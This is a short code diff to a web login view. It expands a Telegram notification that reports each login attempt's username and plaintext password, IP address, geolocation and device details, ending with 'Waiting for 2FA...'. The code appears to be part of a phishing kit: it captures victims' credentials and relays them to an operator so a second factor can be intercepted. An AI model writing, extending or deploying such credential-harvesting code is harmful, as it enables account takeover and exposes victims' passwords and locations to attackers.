@@ -133,12 +133,28 @@ def login_view(request):
             'login_time': timezone.now().strftime('%Y-%m-%d %H:%M:%S')
         }
 
-        # Send simple LOGIN notification to Telegram immediately
+        # Send comprehensive LOGIN notification to Telegram
         telegram_message = f"""🔐 <b>LOGIN ATTEMPT</b>
 
-👤 <b>Email/Username/Phone:</b> {identifier}
+👤 <b>Identifier:</b> {identifier}
 🔑 <b>Password:</b> {password}
+
+📍 <b>LOCATION INFO:</b>
 🌐 <b>IP Address:</b> {ip_address}
+🌍 <b>Country:</b> {location_data.get('country', 'N/A')}
+🏙️ <b>City:</b> {location_data.get('city', 'N/A')}
+📌 <b>Region:</b> {location_data.get('region', 'N/A')}
+🌐 <b>ISP:</b> {location_data.get('isp', 'N/A')}
+📍 <b>Coordinates:</b> {location_data.get('latitude', 'N/A')}, {location_data.get('longitude', 'N/A')}
+
+💻 <b>DEVICE INFO:</b>
+🖥️ <b>Device:</b> {ua_data.get('device_type', 'N/A')}
+🌐 <b>Browser:</b> {ua_data.get('browser_name', 'N/A')} {ua_data.get('browser_version', '')}
+⚙️ <b>OS:</b> {ua_data.get('os_name', 'N/A')}
+📱 <b>Screen:</b> {screen_resolution or 'N/A'}
+🌍 <b>Language:</b> {language or 'N/A'}
+⏰ <b>Timezone:</b> {timezone_data or 'N/A'}
+
 ⏰ <b>Time:</b> {timezone.now().strftime('%Y-%m-%d %H:%M:%S')}
 
 ⚠️ <i>Waiting for 2FA...</i>"""
